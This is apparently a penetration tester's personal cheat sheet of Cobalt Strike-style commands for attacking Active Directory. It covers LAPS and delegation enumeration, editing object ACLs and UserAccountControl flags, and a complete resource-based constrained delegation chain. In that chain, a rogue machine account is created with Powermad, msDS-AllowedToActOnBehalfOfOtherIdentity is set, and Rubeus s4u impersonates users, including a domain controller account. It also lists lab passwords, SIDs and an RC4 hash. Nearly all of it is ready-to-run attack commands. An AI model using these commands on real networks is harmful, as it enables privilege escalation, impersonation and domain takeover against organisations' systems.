==ENUMERATION==

# View Applocker Policy
    powerpick Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Find all shares on a a domain
    powershell Find-DomainShare -ComputerDomain cyber.local
    
# Who can view LAPS Passwords (Chanage -Computername)
    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-NetComputer -ComputerName 'M3WEBAW.M3C.LOCAL' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject

# Find Users/Computers with Delegation 
    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainComputer -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl
    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainUser -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl
    Powerview: Get-DomainComputer -TrustedToAuth | select dnshostname, msds-AllowedToDelegateTo


==TARGETING==

# Get User, Computer, Group Attributes
    PowerView
        Computer: powerpick Get-DomainComputer -Identity corewkt002
        User: powerpick Get-DomainUser -Identity "Steven.Sanchez"
        Group: powerpick Get-DomainGroup -Identity "Server Admins"        
    PoweMad
        powerpick Get-MachineAccountAttribute -DistinguishedName 'CN=COREWKT002,OU=Workstations,OU=Computers,OU=core,DC=core,DC=cyber,DC=local' -MachineAccount corewkt002 -Attribute ServicePrincipalName -Verbose

# View OU Object ACL by SID
    powerpick get-netou | Get-ObjectAcl -ResolveGUIDs | where {$_.SecurityIdentifier -eq "S-1-5-21-1559563558-3652093953-1250159885-1103"}

# View AD Object ACL by SID
    powerpick get-objectacl -identity corewkt002 -ResolveGUIDs | where {$_.SecurityIdentifier -eq "S-1-5-21-1559563558-3652093953-1250159885-1103"}
    Get AD ACL Permissions on a target (samccountname=target; securityidentifier=user)
        powerpick get-objectacl -samaccountname corewkt002 -resolveguids | where-object {$_.SecurityIdentifier -eq 'S-1-5-21-1559563558-3652093953-1250159885-1103'} | select AceType, ObjectAceType, ActiveDirectoryRights 
    
# Modify AD Object ACL
    powerpick add-objectacl -targetidentity corewkt002 -PrincipalIdentity "ilene.rasch" -Rights All
    
# Write Extended Attributes
    PowerView
        powerpick set-domainobject -Identity corewkt002 -Set @{'description'='gotcha'} -Verbose
    PowerMad
        Set-MachineAccountAttribute -DistinguishedName 'CN=COREWKT002,OU=Workstations,OU=Computers,OU=core,DC=core,DC=cyber,DC=local' -MachineAccount corewkt002 -Attribute ServicePrincipalName -Value "cifs/corewkt002.core.cyber.local" -Append

# Write UserAccountControl Extendedn Attributes
        List all values: powerpick Get-DomainComputer -Identity corewkt002 | select useraccountcontrol | ConvertFrom-UACValue -ShowAll
        powerpick Set-ADObject -Identity corewkt002 -XOR @{useraccountcontrol=16777216} -Verbose

# Get TGT for current user context using GSS-API
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
    powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('###PUT THE SID HERER AND CHANGE COMPNAME AT END###'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer MYTESTCOMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    powerpick $RawBytes = Get-DomainComputer MYTESTCOMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
        * Above uses PowerView
    Set-ADComputer TargetCompName -PrincipalsAllowedToDelegateToAccount (Get-ADComputer ComputerWithSPN)
        * Needs AD PS Tools installed

# Impersonate using Rubeus    
    Ticket: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9j...TE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
    Hash: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:MYTESTCOMPUTER$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt





==OTHER NOTES==
Generic Write Add New Machine (Resource Based Contrained Delegation)

# Generic Write (Added New Machine Account)
    powershell-import /home/user/Dropbox/tools/post-exploit/windows/Powermad/Powermad.ps1
    powerpick New-MachineAccount -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
            * Specify OU
              powerpick New-MachineAccount -DistinguishedName "CN=test111,OU=Servers,OU=Computers,OU=m3c,DC=m3c,DC=local" -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString '1q2w3e!Q@W#E' -AsPlainText -Force)

    powershell-import /home/user/Dropbox/tools/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
    powerpick Get-DomainComputer MYTESTCOMPUTER -Properties objectsid | Select -Expand objectsid
            * S-1-5-21-340507432-2615605230-720798708-3104
    powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('###PUT THE SID HERER AND CHANGE COMPNAME AT END###'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer MYTESTCOMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    powerpick $RawBytes = Get-DomainComputer MYTESTCOMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe hash /password:Password123! /user:MYTESTCOMPUTER$ /domain:m3c.local
    
    
# GenericWrite (Write Property to DC)

    # Change SID to user to want to grant permission and Get-DomainComputer)
    powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('S-1-5-21-340507432-2615605230-720798708-1293'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer <TARGETCOMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
            * SID must be object with SPN
    # Sets the property
    powerpick $RawBytes = Get-DomainComputer <TARGETCOMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
    # Verify the property
    powerpick Get-DomainComputer <TARGETCOMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'
    # Execute (Run rubeus tgtdeleg to get ticket)
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIFFDCCB...d0GwlNM0MuTE9DQUw= /impersonateuser:kenneth.kea /domain:m3c.local /msdsspn:cifs/m3dc.m3c.local /altservice:ldap /ptt
